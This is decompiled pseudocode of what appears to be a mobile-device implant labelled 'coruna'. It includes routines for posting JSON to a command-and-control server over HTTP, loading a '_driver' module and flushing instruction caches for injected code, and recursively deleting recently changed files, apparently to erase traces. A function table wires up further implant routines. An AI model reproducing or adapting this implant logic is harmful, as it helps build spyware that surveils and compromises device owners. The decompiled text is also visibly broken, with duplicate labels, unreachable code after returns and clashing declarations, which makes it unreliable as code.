                                err = _CFReadStreamSetClient(serial_8,0x1a,buf,&block_ctx);
                                if (err == 0) {
                                  bootargs = 0;
                                  err = 0x3010;
                                }
                                else {
                                  size = _CFRunLoopGetCurrent();
                                  _CFReadStreamScheduleWithRunLoop(serial_8,size,type_id_9);
                                  err = _CFReadStreamOpen(serial_8);
                                  if (err == 0) {
                                    bootargs = 0;
                                    err = 0x300b;
                                  }
                                  else {
                                    _CFRunLoopRunInMode(0x406e000000000000,kind,0);
                                    _CFReadStreamClose(serial_8);
                                    err = (int)ptr[1];
                                    if (err == 0) {
                                      err = 0x3011;
                                      if (*(uint *)((long)ptr + 0xc) < 400) {
                                        err = 0;
                                      }
                                      if (*(uint *)((long)ptr + 0xc) < 400 && (!err && !status)
                                         ) {
                                        bootargs = _CFHTTPMessageCopyBody(*ptr);
                                        if (bootargs == 0) {
                                          bootargs = 0;
                                          err = 0x3019;
                                        }
                                        else {
                                          err = 0;
                                          *copy = bootargs;
                                        }
                                        goto exit_ok;
                                      }
                                    }
                                    bootargs = 0;
                                  }
                                }
exit_ok:
                                _free(ptr);
                              }
                              _CFRelease(serial_9);
                            }
                          }
                        }
                        else {
                          block_ctx = type_id;
                          sa_new[0] = port;
                          serial_9 = _CFDictionaryCreate(type_id_10,&block_ctx,sa_new,1,0,0);
                          if (serial_9 == 0) {
                            bootargs = 0;
                            err = 0x300f;
                          }
                          else {
                            err = _CFReadStreamSetProperty(serial_8,type_id_8,serial_9);
                            _CFRelease(serial_9);
                            if (err != 0) goto invalid;
again:
                            bootargs = 0;
                            err = 0x300c;
                          }
                        }
                      }
                      _CFRelease(serial_8);
                    }
                  }
                  else {
                    serial_buf = _CFStringCreateWithCString(type_id_10,"User-Agent",0x8000100);
                    if (serial_buf != 0) {
                      _CFHTTPMessageSetHeaderFieldValue(serial_7,serial_buf,addr);
                      goto found;
                    }
                    serial_buf = 0;
nomem:
                    bootargs = 0;
                    thread_attr = 0;
                    host_info = 0;
                    err = 0xad009;
                  }
                  _CFRelease(serial_7);
                  _CFRelease(base);
                  _CFRelease(ctx_val);
                  _CFRelease(serial);
                  if (serial_buf != 0) {
                    _CFRelease();
                  }
                  if (host_info != 0) {
                    _CFRelease();
                  }
                  if (thread_attr != 0) {
                    _CFRelease();
                  }
                  if ((bootargs != 0) && (serial = bootargs, err != 0)) goto next;
                }
              }
              base = action;
              if ((6 < u) || (err == 0)) goto parse_ok;
            }
            u = u + 1;
          } while( true );
        }
        ls9 = _strlen(str_2);
        off = _CFDataCreate(type_id_10,str_2,ls9);
        if (off != 0) goto check_ok;
        err = 0x3018;
      }
      else {
        scratch = _CFStringCreateWithCString(type_id_10,addr_2,0x8000100);
        if (scratch == 0) {
          scratch = 0;
          off = 0;
          err = 0x3016;
          _CFRelease(handle);
          if (addr != 0) {
          load_ok:
          _CFRelease(addr);
          }
          if (scratch != 0) {
          _CFRelease(scratch);
          }
          if (action != 0) {
          _CFRelease();
          }
          return err;
          _CFRelease(off);
          if (action != 0) {
          _CFRelease();
          }
          return err;
        }
        off = _CFStringGetLength();
        if (0 < off) goto cleanup;
        err = 0x3017;
      }
      off = 0;
      _CFRelease(handle);
      if (addr != 0) {
      load_ok:
      _CFRelease(addr);
      }
      if (scratch != 0) {
      _CFRelease(scratch);
      }
      if (action != 0) {
      _CFRelease();
      }
      return err;
      _CFRelease(off);
      if (action != 0) {
      _CFRelease();
      }
      return err;
    }
    addr = _CFStringCreateWithCString(type_id_10,handle,0x8000100);
    if (addr != 0) {
      off = _CFStringGetLength();
      if (0 < off) goto done;
      _CFRelease(handle);
      off = 0;
      scratch = 0;
      err = 0x3017;
      goto load_ok;
    }
    err = 0x3016;
  }
load_ok_15:
  _CFRelease(off);
fail:
  if (action != 0) {
    _CFRelease();
  }
  return err;
parse_ok:
  if (err == 0 && (!err && !status)) {
    if (action == 0) {
load_ok_16:
      err = 0x3005;
    }
    else {
      u = _CFDataGetLength(action);
      if (u == 0) {
        err = 0x3004;
      }
      else {
        buf = (void *)_CFDataGetBytePtr(base);
        if (buf == (void *)0x0) goto load_ok_16;
        str = _malloc((unsigned long)u);
        if (str == (void *)0x0) {
          err = 0xad009;
        }
        else {
          _memcpy(str,buf,(unsigned long)u);
          err = 0;
          *val = str;
          *size = u;
        }
      }
    }
  }
skip:
  _CFRelease(handle);
  if (addr != 0) {
load_ok:
    _CFRelease(addr);
  }
  if (scratch != 0) {
    _CFRelease(scratch);
  }
  if (action != 0) {
  _CFRelease();
  }
  return err;
  _CFRelease(off);
  if (action != 0) {
  _CFRelease();
  }
  return err;
}





uint64_t
uint64_t coruna_c2_http_json(char *path,uint64_t val,uint64_t id_2,uint64_t size_3, uint64_t off_4)
{
  int err;
  uint64_t u;
  uint scratch;
  void *bootargs;
  
  bootargs = (void *)0x0;
  scratch = 0;
  if ((path == (char *)0x0) || (*path == '\0')) {
    u = 0;
  }
  else {
    err = _strncmp(path,"http://",7);
    if ((err == 0) || (err = _strncmp(path,"https://",8), err == 0)) {
      u = coruna_c2_json_body(id_2,size_3,off_4,&bootargs,&scratch);
      if ((int)u == 0) {
        u = coruna_cfhttp_get_post(path,val,"application/json",bootargs,0,0);
        _bzero(bootargs,(unsigned long)scratch);
        _free(bootargs);
      }
    }
    else {
      u = 0xad014;
    }
  }
  return u;
}





uint64_t
uint64_t coruna_c2_json_body(uint64_t val,int64_t arg,uint64_t id_2,uint64_t size_3, uint64_t off_4)
{
  uint64_t u;
  char *ptr;
  uint scratch;
  void *bootargs;
  
  bootargs = (void *)0x0;
  scratch = 0;
  if (arg == 0) {
    ptr = "{\\\"e\\\":%u,\\\"l\\\":%u}";
  }
  else {
    ptr = "{\\\"e\\\":%u,\\\"f\\\":\\\"%s\\\",\\\"l\\\":%u}";
  }
  u = coruna_vsnprintf_alloc(&bootargs,&scratch,ptr);
  if ((int)u == 0) {
    u = coruna_vsnprintf_alloc(size_3,off_4,"{\"cmd\":\"logmsg\",\"args\":{\"msg\":\"%s\"}}");
    _bzero(bootargs,(unsigned long)scratch);
    _free(bootargs);
  }
  return u;
}





void coruna_cfhttp_stream_client(uint64_t val,uint64_t id_2,uint64_t *size_3)
{
  int err;
  uint32_t u;
  long handle;
  unsigned long size;
  uint8_t port[16];
  uint8_t scratch[4096];
  
  port = (*(void (*)k_implant_chkstk_darwin_slot)();
  size = port;
  handle = port;
  if ((handle != 0) && (size_3 != (uint64_t *)0x0)) {
    if (size < 9) {
      switch(size) {
      default:
        return;
      case 2:
        handle = _CFReadStreamRead(handle,scratch,0x1000);
        if (handle < 1) {
          return;
        }
        err = _CFHTTPMessageAppendBytes(*size_3,scratch,handle);
        if (err != 0) {
          return;
        }
        break;
      case 3:
      case 5:
      case 6:
      case 7:
        break;
      case 8:
        *(uint32_t *)(size_3 + 1) = 0x3008;
      }
    }
    else if ((size == 0x10) &&
            (handle = _CFReadStreamCopyProperty
                               (handle,*(uint64_t *)
                                       k_implant_kcfstreampropertyhttpresponseheader_slot),
            handle != 0)) {
      u = _CFHTTPMessageGetResponseStatusCode();
      *(uint32_t *)((long)size_3 + 0xc) = u;
      _CFRelease(handle);
    }
  }
  _CFRunLoopGetCurrent();
  _CFRunLoopStop();
fail:
  return;
}





uint64_t coruna_vsnprintf_alloc(uint64_t *val,int *flags,char *path)
{
  uint u;
  int err;
  char *ptr;
  uint64_t size;
  unsigned long version;
  
  size = 0xad001;
  if (((val != (uint64_t *)0x0) && (flags != (int *)0x0)) && (path != (char *)0x0)) {
    u = _vsnprintf((char *)0x0,0,path,&ghidra_stack_0);
    if ((int)u < 1) {
      ptr = (char *)0x0;
      err = 0;
      size = 0xad014;
    }
    else {
      version = (unsigned long)(u + 1);
      ptr = _malloc(version);
      if (ptr == (char *)0x0) {
        size = 0xad009;
        err = 0;
      }
      else {
        err = _vsnprintf(ptr,version,path,&ghidra_stack_0);
        if ((int)u < err) {
          _bzero(ptr,version);
          _free(ptr);
          ptr = (char *)0x0;
          err = 0;
          size = 0xad00b;
        }
        else {
          size = 0;
          ptr[u] = '\0';
        }
      }
    }
    *val = ptr;
    *flags = err;
  }
  return size;
}





void coruna_flush_caches(long ctx,long addr,uint size)
{
  uint u;
  uint size;
  unsigned long version;
  uint port;
  
  if ((addr == 0) || (size == 0)) {
    size = *(uint *)(ctx + 0x90);
    if (size == 0) {
      return;
    }
    addr = *(long *)(ctx + 0x88);
  }
  version = 0;
  port = size;
  do {
    size = port - 0x50000;
    if (0x4ffff < port) {
      port = 0x50000;
    }
    _sys_dcache_flush((void *)(addr + version),(unsigned long)port);
    _sys_icache_invalidate((void *)(addr + version),(unsigned long)port);
    u = (int)version + 0x50000;
    version = (unsigned long)u;
    port = size;
  } while (u < size);
  return;
}





uint64_t coruna_bzero_2_2(long handle,uint size)
{
  uint u;
  long handle;
  uint *ptr;
  uint size;
  void *ptr;
  
  handle = *(long *)(handle + 0x88) + (unsigned long)*(uint *)(handle + 0x90);
  ptr = (uint *)(handle + -4);
  if (*(uint **)(handle + 0x138) != (uint *)0x0) {
    ptr = *(uint **)(handle + 0x138);
  }
  do {
    size = *ptr;
    u = size + size + (uint)(size == 0) * 4;
    if (*(uint *)(handle + 0x90) < u) {
      return 0xc003;
    }
  } while (*ptr != size);
  *ptr = u;
  ptr = (void *)(handle - (unsigned long)u);
  *(void **)(handle + 0x48) = ptr;
  *(uint *)(handle + 0x50) = size;
  _bzero(ptr,(unsigned long)size);
  if (*(void (**)(handle + 0x120) != (void (*)0x0) {
    (**(void (**)(handle + 0x120))
              (handle,*(uint64_t *)(handle + 0x48),*(uint32_t *)(handle + 0x50));
  }
  return 0;
}





long coruna_surface_dispatch_thunk(long handle,unsigned long arg)
{
  long handle;
  
  if (*(uint *)(handle + 0x50) < arg) {
    handle = 0;
  }
  else {
    handle = *(long *)(handle + 0x48);
    *(unsigned long *)(handle + 0x48) = handle + arg;
    *(uint *)(handle + 0x50) = *(uint *)(handle + 0x50) - (int)arg;
  }
  return handle;
}





uint64_t coruna_bzero(uint64_t val,void *ctx,size_t len)
{
  if ((ctx != (void *)0x0) && (len != 0)) {
    _bzero(ctx,len);
  }
  return 0;
}





uint64_t coruna_bzero_10254(uint64_t val,void *ctx,size_t len)
{
  _bzero(ctx,len);
  return 0;
}





uint coruna_chmod_dir_walk(char *path,char *str_2,char *name_3,uint size)
{
  char *ptr;
  char *buf;
  int err;
  uint u;
  time_t lt5;
  int *err;
  long handle;
  size_t ls8;
  long addr;
  size_t ls10;
  uint *ptr;
  uint size;
  char scratch [1024];
  stat bootargs;
  
  bootargs.st_gen = 0;
  bootargs.st_lspare = 0;
  bootargs.st_blksize = 0;
  bootargs.st_flags = 0;
  bootargs.st_qspare[1] = 0;
  bootargs.st_qspare[0] = 0;
  bootargs.st_birthtimespec.tv_nsec = 0;
  bootargs.st_birthtimespec.tv_sec = 0;
  bootargs.st_blocks = 0;
  bootargs.st_size = 0;
  bootargs.st_mtimespec.tv_nsec = 0;
  bootargs.st_mtimespec.tv_sec = 0;
  bootargs.st_ctimespec.tv_nsec = 0;
  bootargs.st_ctimespec.tv_sec = 0;
  bootargs.st_rdev = 0;
  bootargs = 0;
  bootargs.st_uid = 0;
  bootargs.st_gid = 0;
  bootargs.st_atimespec.tv_nsec = 0;
  bootargs.st_atimespec.tv_sec = 0;
  bootargs.st_ino = 0;
  bootargs.st_dev = 0;
  bootargs.st_mode = 0;
  bootargs.st_nlink = 0;
  _bzero(scratch,0x400);
  lt5 = _time((time_t *)0x0);
  size = 0xad001;
  if ((path != (char *)0x0) && (*path != '\0')) {
    err = _lstat(path,&bootargs);
    if (err == 0) {
      size = 0xad00b;
      if ((bootargs.st_mode & 0xf000) == 0x4000) {
        _chmod(path,0x1ed);
        bootargs.st_ino = 0;
        bootargs.st_dev = 0;
        bootargs.st_mode = 0;
        bootargs.st_nlink = 0;
        bootargs.st_rdev = 0;
        bootargs = 0;
        bootargs.st_uid = 0;
        bootargs.st_gid = 0;
        bootargs.st_atimespec.tv_nsec = 0;
        bootargs.st_atimespec.tv_sec = 0;
        bootargs.st_mtimespec.tv_nsec = 0;
        bootargs.st_mtimespec.tv_sec = 0;
        bootargs.st_ctimespec.tv_nsec = 0;
        bootargs.st_ctimespec.tv_sec = 0;
        bootargs.st_birthtimespec.tv_nsec = 0;
        bootargs.st_birthtimespec.tv_sec = 0;
        bootargs.st_blocks = 0;
        bootargs.st_size = 0;
        bootargs.st_gen = 0;
        bootargs.st_lspare = 0;
        bootargs.st_blksize = 0;
        bootargs.st_flags = 0;
        bootargs.st_qspare[1] = 0;
        bootargs.st_qspare[0] = 0;
        handle = _opendir(path);
        if (handle != 0) {
          ls8 = _strlen(path);
          buf = "%s%s";
          if (path[ls8 - 1] != '/') {
            buf = "%s/%s";
          }
          err = ___error();
          *err = 0;
          addr = _readdir(handle);
          if (addr == 0) {
            size = 0;
          }
          else {
            size = 0;
            do {
              ptr = (char *)(addr + 0x15);
              err = _strcmp(ptr,"..");
              u = size;
              if ((err != 0) && (err = _strcmp(ptr,"."), err != 0)) {
                u = _snprintf(scratch,0x400,buf);
                if (u == 0xffffffff) {
                  err = ___error();
                  err = *err;
                  ptr = (uint *)___error();
                  u = -*ptr;
                  if (-1 < err) {
                    u = *ptr;
                  }
                  u = u | 0x40000000;
                }
                else if (u < 0x400) {
                  err = _lstat(scratch,&bootargs);
                  u = 0xad00b;
                  if (err == 0) {
                    if ((bootargs.st_mode & 0xf000) == 0x4000) {
                      u = 0;
                      if ((*ptr != '\0') && (*ptr != '.')) {
                        u = coruna_chmod_dir_walk(scratch,str_2,name_3,size);
                      }
                    }
                    else {
                      if (str_2 == (char *)0x0) {
fail:
                        if (name_3 != (char *)0x0) {
                          ls8 = _strlen(ptr);
                          ls10 = _strlen(name_3);
                          if ((ls8 < ls10) ||
                             (err = _strncmp((char *)(addr + (ls8 - ls10) + 0x15),name_3,
                                               ls10), err != 0)) goto done;
                        }
                        if ((size == 0) ||
                           ((lt5 <= bootargs.st_ctimespec.tv_sec ||
                            (lt5 - bootargs.st_ctimespec.tv_sec <= (long)(unsigned long)size)))) {
                          u = 0xad001;
                          if (scratch[0] != '\0') {
                            err = _unlink(scratch);
                            if ((err == 0) || (err = ___error(), *err == 2))
                            goto done;
                            err = ___error();
                            err = *err;
                            ptr = (uint *)___error();
                            u = -*ptr;
                            if (-1 < err) {
                              u = *ptr;
                            }
                            u = u | 0x40000000;
                          }
                          goto cleanup;
                        }
                      }
                      else {
                        ls8 = _strlen(ptr);
                        ls10 = _strlen(str_2);
                        if ((ls10 <= ls8) &&
                           (err = _strncmp(ptr,str_2,ls10), err == 0)) goto fail;
                      }
done:
                      u = 0;
                    }
                  }
cleanup:
                  bootargs.st_gen = 0;
                  bootargs.st_lspare = 0;
                  bootargs.st_blksize = 0;
                  bootargs.st_flags = 0;
                  bootargs.st_qspare[1] = 0;
                  bootargs.st_qspare[0] = 0;
                  bootargs.st_birthtimespec.tv_nsec = 0;
                  bootargs.st_birthtimespec.tv_sec = 0;
                  bootargs.st_blocks = 0;
                  bootargs.st_size = 0;
                  bootargs.st_mtimespec.tv_nsec = 0;
                  bootargs.st_mtimespec.tv_sec = 0;
                  bootargs.st_ctimespec.tv_nsec = 0;
                  bootargs.st_ctimespec.tv_sec = 0;
                  bootargs.st_rdev = 0;
                  bootargs = 0;
                  bootargs.st_uid = 0;
                  bootargs.st_gid = 0;
                  bootargs.st_atimespec.tv_nsec = 0;
                  bootargs.st_atimespec.tv_sec = 0;
                  bootargs.st_ino = 0;
                  bootargs.st_dev = 0;
                  bootargs.st_mode = 0;
                  bootargs.st_nlink = 0;
                }
                else {
                  u = 0xad00c;
                }
                _bzero(scratch,0x400);
                if (size != 0) {
                  u = size;
                }
              }
              size = u;
              err = ___error();
              *err = 0;
              addr = _readdir(handle);
            } while (addr != 0);
          }
          err = ___error();
          if (*err != 0) {
            err = ___error();
            err = *err;
            ptr = (uint *)___error();
            size = -*ptr;
            if (-1 < err) {
              size = *ptr;
            }
            size = size | 0x40000000;
          }
          err = _closedir(handle);
          if (err != 0) {
            size = 0xad00b;
          }
        }
      }
    }
    else {
      err = ___error();
      if (*err == 2) {
        size = 0;
      }
      else {
        err = ___error();
        err = *err;
        ptr = (uint *)___error();
        size = -*ptr;
        if (-1 < err) {
          size = *ptr;
        }
        size = size | 0x40000000;
      }
    }
  }
  return size;
}





uint64_t coruna_unlink_recent_in_dir(char *path,uint size)
{
  size_t ls1;
  char err;
  int err;
  time_t lt4;
  long handle;
  size_t ls6;
  long addr;
  char *ptr;
  size_t ls9;
  char *buf;
  uint64_t u;
  stat scratch;
  
  u = 0xad001;
  lt4 = _time((time_t *)0x0);
  if ((path != (char *)0x0) && (*path != '\0' && size != 0)) {
    handle = _opendir(path);
    if (handle == 0) {
      u = 0xad00b;
    }
    else {
      ls6 = _strlen(path);
      err = path[ls6 - 1];
      ls1 = ls6;
      if (err != '/') {
        ls1 = ls6 + 1;
      }
      addr = _readdir(handle);
      if (addr != 0) {
        do {
          if (*(char *)(addr + 0x14) == '\b') {
            ptr = _calloc(ls1 + 1 + (unsigned long)*(ushort *)(addr + 0x12),1);
            if (ptr == (char *)0x0) {
              _readdir(handle);
              u = 0xad009;
              goto fail;
            }
            scratch.st_gen = 0;
            scratch.st_lspare = 0;
            scratch.st_blksize = 0;
            scratch.st_flags = 0;
            scratch.st_qspare[1] = 0;
            scratch.st_qspare[0] = 0;
            scratch.st_birthtimespec.tv_nsec = 0;
            scratch.st_birthtimespec.tv_sec = 0;
            scratch.st_blocks = 0;
            scratch.st_size = 0;
            scratch.st_mtimespec.tv_nsec = 0;
            scratch.st_mtimespec.tv_sec = 0;
            scratch.st_ctimespec.tv_nsec = 0;
            scratch.st_ctimespec.tv_sec = 0;
            scratch.st_rdev = 0;
            scratch = 0;
            scratch.st_uid = 0;
            scratch.st_gid = 0;
            scratch.st_atimespec.tv_nsec = 0;
            scratch.st_atimespec.tv_sec = 0;
            scratch.st_ino = 0;
            scratch.st_dev = 0;
            scratch.st_mode = 0;
            scratch.st_nlink = 0;
            _strncpy(ptr,path,ls6);
            if (err != '/') {
              ls9 = _strlen(ptr);
              (ptr + ls9)[0] = '/';
              (ptr + ls9)[1] = '\0';
            }
            buf = _strcat(ptr,(char *)(addr + 0x15));
            err = _stat(buf,&scratch);
            if ((err == 0) &&
               ((lt4 <= scratch.st_ctimespec.tv_sec ||
                (lt4 - scratch.st_ctimespec.tv_sec <= (long)(unsigned long)size)))) {
              _unlink(ptr);
            }
            ls9 = _strlen(ptr);
            _bzero(ptr,ls9);
            _free(ptr);
          }
          addr = _readdir(handle);
        } while (addr != 0);
      }
      u = 0;
fail:
      _closedir(handle);
    }
  }
  return u;
}





unsigned long coruna_load_driver(long *arg,long val,uint64_t n,uint64_t *m)

{
  long *data;
  uint size;
  uint type_id;
  unsigned long version;
  char *str;
  size_t ls6;
  short *lps7;
  unsigned long type_id_11;
  uint64_t kind;
  long *obj;
  uint64_t *region;
  long plist;
  void (*cache_37)(void);
  uint32_t cache_38;
  long cache_39;
  
  region = (uint64_t *)0x0;
  plist = 0;
  type_id_11 = 0xad001;
  if ((arg == (long *)0x0) || (val == 0)) {
    return 0xad001;
  }
  version = coruna_implant_residual_45(&plist,&region);
  if ((int)version != 0) {
    return version;
  }
  version = coruna_implant08_via_ctx_free_5(region,val);
  coruna_ctx_free_10f08(plist);
  return version;
  if (*(char **)(val + 0x78) == (char *)0x0) {
    version = 0;
  }
  else {
    str = _strdup(*(char **)(val + 0x78));
    region[7] = str;
    version = 0;
    if (str != (char *)0x0) {
      kind = *region;
      ls6 = _strlen(str);
      type_id = coruna_pthread_rwlock_unlock(kind,0x70003,str,(int)ls6 + 1);
      size = 0;
      if (type_id != 0x700a) {
        size = type_id;
      }
      version = (unsigned long)size;
    }
  }
  if (*(char **)(val + 0xa0) == (char *)0x0) {
load_ok_21:
    if ((int)version == 0) goto load_ok_22;
  }
  else {
    str = _strdup(*(char **)(val + 0xa0));
    region[9] = str;
    if (str == (char *)0x0) goto load_ok_21;
    kind = *region;
    ls6 = _strlen(str);
    version = coruna_pthread_rwlock_unlock(kind,0x70004,str,(int)ls6 + 1);
    if ((int)version != 0x700a) goto load_ok_21;
load_ok_22:
    *(uint8_t *)(region + 8) = *(uint8_t *)(val + 0x5c0);
    if ((((plist != 0) && (obj = *(long **)(plist + 8), obj != (long *)0x0)) &&
        (*(long *)(val + 0x30) != 0)) &&
       ((*(long *)(val + 0x38) != 0 && (*(long *)(val + 0x130) != 0)))) {
      cache_39 = 0;
      cache_38 = 0;
      type_id_11 = (**(void (**)(*obj + 0x18))(*obj,0x90000,&cache_39,&cache_38);
      if ((int)type_id_11 == 0) {
        data = obj + 2;
        type_id_11 = (**(void (**)(val + 0x30))(val,cache_39,cache_38,data);
        if ((int)type_id_11 == 0) {
          cache_37 = (void (*)0x0;
          if (*(void (**)(val + 0x120) != (void (*)0x0) {
            (**(void (**)(val + 0x120))
                      (val,*(uint64_t *)(*data + 0x58),*(uint32_t *)(*data + 0xa8));
          }
          type_id_11 = (**(void (**)(val + 0x38))(val,*data,"_driver",&cache_37);
          if ((int)type_id_11 == 0) {
            obj = obj + 3;
            type_id_11 = (*cache_37)(obj);
            if ((int)type_id_11 == 0) {
              lps7 = (short *)*obj;
              if (((lps7 != (short *)0x0) && (*lps7 == 2)) && (1 < (ushort)lps7[1])) {
                type_id_11 = (**(void (**)(region[3] + 0x18))(region[3],0,region + 4);
                if ((int)type_id_11 == 0) {
                  cache_39 = coruna_u64_pack71((cache_39), (1));
                  if ((*(char *)(val + 0x5c1) != '\0') && (*(char *)(val + 0x5c4) != '\0'))
                  {
                    cache_39 = (unsigned long)cache_39 << 8;
                  }
                  type_id_11 = coruna_bind_loader_create(region + 1,region[3],region[4],*region,&cache_39,
                                       n);
                  if ((int)type_id_11 == 0) {
                    *arg = plist;
                    if (m != (uint64_t *)0x0) {
                      *m = region[4];
                    }
                    return 0;
                  }
                  if (region[4] != 0) {
                    (**(void (**)(region[3] + 0x20))();
                    region[4] = 0;
                  }
                }
                coruna_dlopen_rpath(plist,val);
                goto load_ok_23;
              }
              *obj = 0;
              type_id_11 = 0xad00a;
            }
          }
          (**(void (**)(val + 0x130))(val,*data);
          *data = 0;
        }
      }
    }
load_ok_23:
    str = (char *)region[7];
    if (str != (char *)0x0) {
      ls6 = _strlen(str);
      _bzero(str,ls6);
      _free((void *)region[7]);
      region[7] = 0;
    }
    str = (char *)region[9];
    version = type_id_11;
    if (str != (char *)0x0) {
      ls6 = _strlen(str);
      _bzero(str,ls6);
      _free((void *)region[9]);
      region[9] = 0;
    }
  }
  coruna_ctx_free(*region);
  *region = 0;
load_ok_20:
  coruna_ctx_free_10f08(plist);
  return version;
}





uint64_t coruna_implant08_residual_56(uint64_t *val,uint64_t *id_2)
{
  uint64_t u;
  uint32_t *ptr;
  void *ptr;
  
  u = 0xad001;
  if ((val != (uint64_t *)0x0) && (id_2 != (uint64_t *)0x0)) {
    ptr = _calloc(1,0x140);
    if (ptr != (uint32_t *)0x0) {
      ptr = _calloc(1,0x50);
      if (ptr != (void *)0x0) {
        *ptr = 0x60004;
        *(void **)(ptr + 2) = ptr;
        ((void (**)(void *, long, uint64_t))(ptr + 4))[0] = coruna_implant_via_run_starti;
        ((void (**)(void *, long, uint64_t))(ptr + 6))[0] = coruna_implant_via_run_starti_2;
        ((void (**)(void *, long, uint64_t))(ptr + 8))[0] = coruna_implant_residual_47;
        ((void (**)(void *, long, uint64_t))(ptr + 10))[0] = coruna_chdir_tmp;
        ((void (**)(void *, long, uint64_t))(ptr + 0xc))[0] = coruna_implant_via_run_starti_3;
        ((void (**)(void *, long, uint64_t))(ptr + 0xe))[0] = coruna_implant_via_run_starti_4;
        ((void (**)(void *, long, uint64_t))(ptr + 0x10))[0] = coruna_implant_via_run_starti_5;
        ((void (**)(void *, long, uint64_t))(ptr + 0x12))[0] = coruna_implant_via_run_starti_6;
        ((void (**)(void *, long, uint64_t))(ptr + 0x14))[0] = coruna_implant_residual_48;
        ((void (**)(void *, long, uint64_t))(ptr + 0x16))[0] = coruna_implant_residual_49;
        ((void (**)(void *, long, uint64_t))(ptr + 0x18))[0] = coruna_driver_copy_port_1918;
        ((void (**)(void *, long, uint64_t))(ptr + 0x1a))[0] = coruna_implant_residual_50;
        ((void (**)(void *, long, uint64_t))(ptr + 0x38))[0] = coruna_driver_copy_port_1918;
        ((void (**)(void *, long, uint64_t))(ptr + 0x48))[0] = coruna_implant_residual_51;
        ((void (**)(void *, long, uint64_t))(ptr + 0x1c))[0] = coruna_implant_residual_52;
        ((void (**)(void *, long, uint64_t))(ptr + 0x1e))[0] = coruna_implant_residual_53;
        ((void (**)(void *, long, uint64_t))(ptr + 0x20))[0] = coruna_implant_residual_54;
        ((void (**)(void *, long, uint64_t))(ptr + 0x22))[0] = coruna_implant_residual_55;
        *(uint8_t **)(ptr + 0x24) = &k_implant_rodata_word_11fc8;
        *(uint8_t **)(ptr + 0x26) = &k_implant_rodata_word_12014;
        ((void (**)(void *, long, uint64_t))(ptr + 0x46))[0] = coruna_implant_via_macho_iface_create;
        ((void (**)(void *, long, uint64_t))(ptr + 0x28))[0] = coruna_parse_xnu_release;
        ((void (**)(void *, long, uint64_t))(ptr + 0x2a))[0] = coruna_strncpy;
        ((void (**)(void *, long, uint64_t))(ptr + 0x2c))[0] = coruna_bzero_122f8;
        ((void (**)(void *, long, uint64_t))(ptr + 0x4a))[0] = coruna_strncpy_2;
        ((void (**)(void *, long, uint64_t))(ptr + 0x4c))[0] = coruna_bzero_1241c;
        ((void (**)(void *, long, uint64_t))(ptr + 0x2e))[0] = coruna_implant_residual_56;
        ((void (**)(void *, long, uint64_t))(ptr + 0x30))[0] = coruna_implant_residual_57;
        ((void (**)(void *, long, uint64_t))(ptr + 0x32))[0] = coruna_run_startm;
        ((void (**)(void *, long, uint64_t))(ptr + 0x34))[0] = coruna_csops_12674;
        ((void (**)(void *, long, uint64_t))(ptr + 0x36))[0] = coruna_implant_via_check_softwareupdate;
        ((void (**)(void *, long, uint64_t))(ptr + 0x44))[0] = coruna_implant_via_host_get_special_port;
        ((void (**)(void *, long, uint64_t))(ptr + 0x3a))[0] = coruna_implant_residual_58;
        ((void (**)(void *, long, uint64_t))(ptr + 0x3c))[0] = coruna_implant_residual_59;
        ((void (**)(void *, long, uint64_t))(ptr + 0x3e))[0] = coruna_implant_residual_60;
        ((void (**)(void *, long, uint64_t))(ptr + 0x40))[0] = coruna_driver_copy_port_1918;
        ((void (**)(void *, long, uint64_t))(ptr + 0x42))[0] = coruna_implant_residual_61;
        ((void (**)(void *, long, uint64_t))(ptr + 0x4e))[0] = coruna_implant_residual_62;
        *val = ptr;
        *id_2 = ptr;
        return 0;
      }
      _free(ptr);
    }
    u = 0xad009;
  }
  return u;
}





unsigned long coruna_dlopen_rpath(long arg,long val)

{
  uint u;
  unsigned long size;
  long serial;
  
  size = 0xad001;
  if (((arg != 0) && (serial = *(long *)(arg + 8), serial != 0 && val != 0)) &&
     (*(long *)(val + 0x130) != 0)) {
    if (*(long *)(serial + 0x18) == 0) {
      size = 0;
    }
    else {
      size = (**(void (**)(*(long *)(serial + 0x18) + 0x10))();
      *(uint64_t *)(serial + 0x18) = 0;
    }
    if (*(long *)(serial + 0x10) != 0) {
      u = (**(void (**)(val + 0x130))(val);
      if ((uint)size != 0) {
        u = (uint)size;
      }
      size = (unsigned long)u;
      *(uint64_t *)(serial + 0x10) = 0;
    }
  }
  return size;
}





uint64_t coruna_ctx_free_10f08(uint64_t *val)
{
  size_t ls1;
  uint64_t *ptr;
  char *ptr;
  
  if (val != (uint64_t *)0x0) {
    ptr = (uint64_t *)val[1];
    if (ptr != (uint64_t *)0x0) {
      ptr = (char *)ptr[7];
      if (ptr != (char *)0x0) {
        ls1 = _strlen(ptr);
        _bzero(ptr,ls1);
        _free((void *)ptr[7]);
      }
      ptr = (char *)ptr[9];
      if (ptr != (char *)0x0) {
        ls1 = _strlen(ptr);
        _bzero(ptr,ls1);
        _free((void *)ptr[9]);
      }
      ptr[7] = 0;
      ptr[6] = 0;
      ptr[9] = 0;
      ptr[8] = 0;
      ptr[3] = 0;
      ptr[2] = 0;
      ptr[5] = 0;
      ptr[4] = 0;
      ptr[1] = 0;
      *ptr = 0;
      _free(ptr);
    }
    val[0x25] = 0;
    val[0x24] = 0;
    val[0x27] = 0;
    val[0x26] = 0;
    val[0x21] = 0;
    val[0x20] = 0;
    val[0x23] = 0;
    val[0x22] = 0;
    val[0x1d] = 0;
    val[0x1c] = 0;
    val[0x1f] = 0;
    val[0x1e] = 0;
    val[0x19] = 0;
    val[0x18] = 0;
    val[0x1b] = 0;
    val[0x1a] = 0;
    val[0x15] = 0;
    val[0x14] = 0;
    val[0x17] = 0;
    val[0x16] = 0;
    val[0x11] = 0;
    val[0x10] = 0;
    val[0x13] = 0;
    val[0x12] = 0;
    val[0xd] = 0;
    val[0xc] = 0;
    val[0xf] = 0;
    val[0xe] = 0;
    val[9] = 0;
    val[8] = 0;
    val[0xb] = 0;
    val[10] = 0;
    val[5] = 0;
    val[4] = 0;
    val[7] = 0;
    val[6] = 0;
    val[1] = 0;
    *val = 0;
    val[3] = 0;
    val[2] = 0;
    _free(val);
    return 0;
  }
  return 0xad001;
}





int coruna_implant08_via_implant_residual_46(long handle,long addr_2)
{
  int err;
  int status;
  uint64_t *ptr;
  
  status = 0xad001;
  if ((handle != 0) &&
     (ptr = *(uint64_t **)(handle + 8), ptr != (uint64_t *)0x0 && addr_2 != 0)) {
    err = coruna_implant_residual_46(handle);
    status = (**(void (**)(ptr[1] + 0x20))();
    if (err != 0) {
      status = err;
    }
    if (ptr[4] != 0) {
